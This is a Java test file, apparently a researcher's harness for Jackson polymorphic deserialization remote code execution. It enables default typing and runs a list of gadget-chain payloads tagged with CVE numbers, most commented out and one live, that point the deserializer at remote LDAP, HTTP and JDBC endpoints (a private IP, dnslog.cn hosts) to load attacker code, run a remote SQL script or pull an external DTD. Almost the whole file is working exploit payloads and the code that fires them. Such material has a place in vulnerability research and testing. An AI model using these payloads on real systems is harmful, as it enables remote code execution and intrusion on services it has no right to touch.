package de.javan.jacksonrce.app;

import com.fasterxml.jackson.databind.ObjectMapper;



public class test
{
    public static void main( String[] args ) throws Exception
    {
        Class.forName("org.h2.Driver").newInstance();
        System.out.println("creating objectmapper");
        ObjectMapper om = new ObjectMapper();
        om.enableDefaultTyping();

//        String payload1 = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", " +
//                "\"http://10.20.28.250:8090/spel.xml\"]\n";  //CVE-2017-17485

//        String payload2= "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", {\"properties\": " +
//                "{\"UserTransaction\":\"ldap://10.20.28.250:1389/ayef1i\"}}]"; //CVE-2020-9547


//        String payload3="[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\": " +
//                "\"ldap://10.20.28.250:1389/gzmekr\"}]";  //CVE-2020-9548

//        String payload_1 = "[\"com.zaxxer.hikari.HikariConfig\"," +
//                "{\"metricRegistry\":\"ldap://10.20.28.250:1389/gzmekr\"}] ";   // CVE-2019-14540

//        String payload_1 = " [\"org.hibernate.jmx.StatisticsService\",{\"sessionFactoryJNDIName\": " +
//            "\"ldap://10.20.28.250:1389/gzmekr\"}]"; //CVE-2018-5968
//        System.out.println(payload_1);
//
//        String payload3 = "[\"org.jsecurity.realm.jndi.JndiRealmFactory\"," +
//                "{\"jndiNames\":\"ldap://10.20.28.250:1389/gzmekr\"}]"; //CVE-2020-14195

//        String payload3="[\"com.caucho.config.types.ResourceRef\",{\"lookupName\": \"ldap://10.20.28.250:1389/gzmekr\"}]"; //CVE-2020-10673

//        String payload3 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;" +
//                "TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8001/poc.sql'\"}]"; //CVE-2019-12384

//        String payload3 = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",
// {\"metricRegistry\":\"ldap://5pdy9u.dnslog.cn/Exploit\"}]";  CVE-2020-9546

//        String payload3 = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://q3phgu.dnslog.cn/Exploit\"}]";  // CVE-2020-8840
//        String payload3 = "[\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\"," +
//                "{\"jndiPath\":\"ldap://loqvo5.dnslog.cn/Exploit\"}]"; //CVE-2020-14062
//        String payload3 = "[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://fgrkse.dnslog.cn/Exploit\"}] "; //CVE-2020-14060

//        String payload3 = "[\"javax.swing.JEditorPane\", {\"page\": \"http://amew4n.dnslog.cn?aaa=1&bbb=2\"}}]"; //
//        String payload3 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://2112ki.dnslog.cn/\"}]"; //CVE-2019-12814
//        String payload3 = "[\"com.mysql.cj.jdbc.admin.MiniAdmin\", \"jdbc:mysql://8id1fz.dnslog.cn/db\"] "; //CVE-2019-12086
//        String xml = "<!DOCTYPE root[\\n" +
//                "<!ENTITY % remote SYSTEM \"http://2s9mdd.dnslog.cn/evil.dtd\">\\n" +
//                "%remote; \\n" +
//                "]>";
//        xml = xml.replace("\"", "\\\"");
//        String payload3 = "['org.jboss.util.propertyeditor.DocumentEditor', {'asText': '" + xml + "'}]";
//        payload3 = payload3.replace("'", "\"");  // CVE-2018-19362

        String payload3 = "[\"ch.qos.logback.core.db.JNDIConnectionSource\"," +
                "{\"jndiLocation\":\"ldap://d55ifr.dnslog.cn/Calc\"}]"; //cve-2019-14361

        String payload = payload3;

        System.out.println(payload);

        Object i = om.readValue(payload, Object.class);
        om.writeValueAsString(i);
        System.out.println("done");


    }
}

